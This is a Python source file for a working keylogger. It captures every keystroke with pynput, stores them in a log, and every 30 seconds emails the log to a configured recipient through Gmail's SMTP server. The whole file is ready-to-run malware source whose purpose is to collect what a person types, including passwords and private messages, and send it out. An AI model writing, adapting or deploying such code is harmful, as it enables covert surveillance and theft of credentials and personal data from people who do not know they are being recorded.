from pynput.keyboard import Key, Listener  # Import keyboard listener
import threading  # Import threading to schedule periodic reports
import smtplib  # Import SMTP library to send emails
from email.mime.text import MIMEText  # Import MIMEText to format email body


class KeyLoggerEmail:
    """
    Keylogger class that captures keyboard input and sends logs via email periodically.
    """

    def __init__(self, email_address, email_password, to_email, report_interval=30):
        """
        Initializes the KeyLoggerEmail instance.

        Args:
            email_address (str): Gmail address used to send logs.
            email_password (str): App password for Gmail (required with 2FA).
            to_email (str): Recipient email address.
            report_interval (int): Interval in seconds to send email reports.
        """
        self.log = ""  # Store all keystrokes temporarily
        self.email_address = email_address
        self.email_password = email_password
        self.to_email = to_email
        self.report_interval = report_interval
        # Initialize keyboard listener with callback to process_key_press
        self.listener = Listener(on_press=self.process_key_press)

    def process_key_press(self, key):
        """
        Callback function for each key press.
        Appends pressed key to the log. Special keys are wrapped in brackets.

        Args:
            key: Key pressed on the keyboard (from pynput).
        """
        try:
            # Normal character keys
            self.log += key.char
        except AttributeError:
            # Handle special keys like space, enter, etc.
            if key == Key.space:
                self.log += " "  # Add space for readability
            else:
                self.log += f"[{key.name}]"  # Wrap special key names in brackets

    def send_email(self, subject, body):
        """
        Sends the current log via Gmail SMTP.

        Args:
            subject (str): Email subject line.
            body (str): Email body content (the log).
        """
        # Create email object with the log as the body
        msg = MIMEText(body)
        msg["Subject"] = subject  # Email subject header
        msg["From"] = self.email_address  # Sender
        msg["To"] = self.to_email  # Recipient

        try:
            # Connect to Gmail SMTP server
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # Enable TLS encryption for security
                server.login(self.email_address, self.email_password)  # Login to Gmail
                # Send the email as a raw string
                server.sendmail(self.email_address, self.to_email, msg.as_string())
        except Exception as e:
            print(f"[ERROR] Failed to send email: {e}")

    def report(self):
        """
        Periodically sends the log via email and resets it.
        Schedules itself to run again after report_interval seconds.
        """
        if self.log.strip():  # Only send if there is content
            print(self.log)  # Optional: print log to terminal
            self.send_email("Keylogger Report", self.log)  # Send log via email
            self.log = ""  # Clear log after sending

        # Schedule the next report using threading.Timer
        timer = threading.Timer(self.report_interval, self.report)
        timer.daemon = True  # Daemon thread will exit when main program exits
        timer.start()

    def start(self):
        """
        Starts the keylogger.
        Begins listening to keyboard events and starts periodic reports.
        """
        self.report()  # Start the first report
        self.listener.start()  # Start keyboard listener
        self.listener.join()  # Keep program running until listener stops


# ---------------------------
# Email configuration
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # Must be Gmail app password if 2FA is enabled
TO_EMAIL = "recipient_email@gmail.com"

# Initialize and start the keylogger
keylogger = KeyLoggerEmail(EMAIL_ADDRESS, EMAIL_PASSWORD, TO_EMAIL)
keylogger.start()
